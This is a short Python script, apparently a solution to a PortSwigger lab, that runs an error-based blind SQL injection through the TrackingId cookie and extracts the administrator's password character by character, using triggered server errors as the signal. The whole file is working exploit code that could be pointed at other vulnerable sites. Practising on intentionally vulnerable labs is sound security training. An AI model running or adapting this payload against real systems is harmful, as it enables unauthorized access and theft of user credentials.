import string
import requests

# This script was written while resolving a lab on portswigger where it was requested to perform
# a blind SQL injection triggering conditional responses through errors. This script is inspired
# by the first one, SQLi_blind_triggering_conditional_resposes_exploit.py

characters = string.digits + string.ascii_lowercase
url = "https://0a8d00b904e5b770c018336800d400a8.web-security-academy.net/"
real_trackingid = "zd5fvleq3UeZvmys"

found = False
i = 0
pwd = ""

while found == False:
	for char in characters:
		cookies_dict = {"TrackingId": f"{real_trackingid}' || (SELECT CASE WHEN SUBSTR(password, 1, {i+1}) = '{pwd}{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || '"}
		response = requests.get(url, cookies=cookies_dict)
		
		if (b"Internal Server Error") in response.content:
			pwd += char
			print(pwd)
			cookies_dict = {"TrackingId": f"{real_trackingid}' || (SELECT CASE WHEN (password = '{pwd}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || '"}
			response = requests.get(url, cookies=cookies_dict)
		
			if (b"Internal Server Error") in response.content:
				found = True
				print("Found!")

			break
	
	i += 1